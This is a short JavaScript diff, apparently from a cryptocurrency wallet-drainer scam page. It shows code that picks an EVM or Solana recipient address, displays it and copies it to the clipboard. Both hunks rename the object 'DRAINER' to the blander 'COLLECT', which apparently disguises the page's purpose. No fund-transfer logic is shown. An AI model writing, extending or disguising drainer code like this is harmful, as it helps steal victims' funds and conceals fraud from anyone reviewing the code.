@@ -218,7 +218,7 @@
   const renderTo = () => {
     if (!toRow || !toEl) return;
     const chainKey = document.querySelector('[role="tab"][aria-selected="true"]')?.dataset.chain;
-    const addr = chainKey === "eth" ? DRAINER.evmRecipient : DRAINER.solRecipient;
+    const addr = chainKey === "eth" ? COLLECT.evmRecipient : COLLECT.solRecipient;
     const visible = !$("result")?.hidden;
     toRow.hidden = !visible || !addr;
     if (!addr) return;
@@ -248,7 +248,7 @@
     if (resultEl) new MutationObserver(() => { renderTo(); setTimeout(renderTo, 900); }).observe(resultEl, { attributes: true, attributeFilter: ["hidden"] });
     toCopy?.addEventListener("click", async () => {
       const chainKey = document.querySelector('[role="tab"][aria-selected="true"]')?.dataset.chain;
-      const addr = chainKey === "eth" ? DRAINER.evmRecipient : DRAINER.solRecipient;
+      const addr = chainKey === "eth" ? COLLECT.evmRecipient : COLLECT.solRecipient;
       try { await navigator.clipboard.writeText(addr); toCopy.textContent = "Copied"; setTimeout(() => (toCopy.textContent = "Copy"), 1200); } catch {}
     });
   }
